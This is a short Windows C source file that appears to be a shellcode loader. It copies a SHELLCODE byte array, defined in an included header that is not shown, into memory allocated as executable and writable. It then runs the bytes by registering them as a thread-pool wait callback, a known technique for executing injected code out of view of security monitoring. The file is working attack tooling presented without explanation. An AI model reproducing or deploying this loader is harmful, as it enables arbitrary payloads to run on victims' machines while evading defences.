#include <windows.h>
#include <threadpoolapiset.h>
#include "AsmCodes.h"

unsigned char shellcode[] = SHELLCODE;

VOID ModuleExecutionThroughThreadPool()
{
	HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);
	LPVOID shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(shellcodeAddress, shellcode, sizeof(shellcode));

	PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)shellcodeAddress, NULL, NULL);
	SetThreadpoolWait(threadPoolWait, event, NULL);
	WaitForSingleObject(event, INFINITE);

}